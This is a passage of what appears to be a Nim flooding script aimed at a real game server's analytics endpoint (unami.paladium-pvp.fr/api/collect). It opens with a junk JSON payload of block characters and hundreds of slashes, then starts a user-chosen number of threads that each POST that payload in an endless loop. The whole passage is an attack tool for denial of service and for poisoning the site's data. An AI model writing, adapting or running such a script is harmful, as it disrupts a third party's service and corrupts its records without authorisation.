▛▼⑆▼╬▚█▄╭◥█◤╯◒░▐▄⑇▟░▞⑆░▓▄▚░╯▟⑆⑇▓▼▓◤╬▶▚◀◐▞◒⑇▲⑆▼◐▛◐╭▓◥▞▟⑆▐╭◐╬▼◤▟◀▶▛╭▼▞⑆◒╯▚␥◥▶⑆╭▞▲█◒▞◥▚◒␥▞◀▚▐╭░▓╭╭▶╬◐▟▞╯▟␥▄⑆╯▄⑆█▐␥▓▼▛▐▶◀◀◥▓◒▛█▛▛╯◒⑇⑇▐▟◤▄▲◀╬▞▚⑇◤◒◒▟◥▞▄␥▒╬▛▒▚␥▟◀▼◐╬␥◐▼◀▒░╯◀◒▞▞▟◐╭▶◐▼◐␥▐╭╯╯▄▲▛▐█◒◤▓▛▄◤▞╯◀⑆░␥▚▶╬░▲░▄◥▓▄╬▓▄▼╭◒␥▚▲◒╭▐◐▛▒◒◤╭▼▐▐◐▶▐▓◐█▐◥▄▚╬◀▶█▶◤⑆╯◀▓▛◤▼▓▛▞▼█▛◒◒▛▶▓⑇⑆▟⑇▟▓◐▄▲▶▞▼◤⑆█▞◒▶◤␥◤▄◒░◀▛█▞▓▒░▄█▲█▒▶▒▒╬◒▛⑆▄◤◀█╭▞▓◀▞▟▞▐▲⑇◥◥◀◐▚◥▞╭◥▚▒▒▲▲▞▼◒▒◀▚◐⑇▛▄▲▞◥▓▲◐␥◀◒▞⑆◥⑆╬▚▟╯░◐◐╯⑇▒╭▲◐◥▲⑆▓▄▲◤▓◥◀▶",
        "url": "//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////",
        "referrer": "https://paladium-pvp.fr/"
    }
}"""
proc spam(): void {.thread.} =
    while true:
        try:
            let
                req = Request(
                    url: parseUrl("https://unami.paladium-pvp.fr/api/collect"),
                    verb: "POST",
                    body: payload
                )
                res = fetch(req)
            case res.code:
                of 200:
                    echo "[+] Payload sent"
                of 404:
                    echo "[-] Caca happened"
                else:
                    echo "[-] AMONG US?!?!?! " & $res.code
        except Exception:
            discard

clear()
echo "Thread amount? (Warning that shit is fast asf)"
var 
    thread: string = readLine(stdin)
    cLock: Lock
    t: Thread[void]

initLock(cLock)

for i in 0..thread.parseInt:
    createThread[void](t, spam)

joinThreads(t)
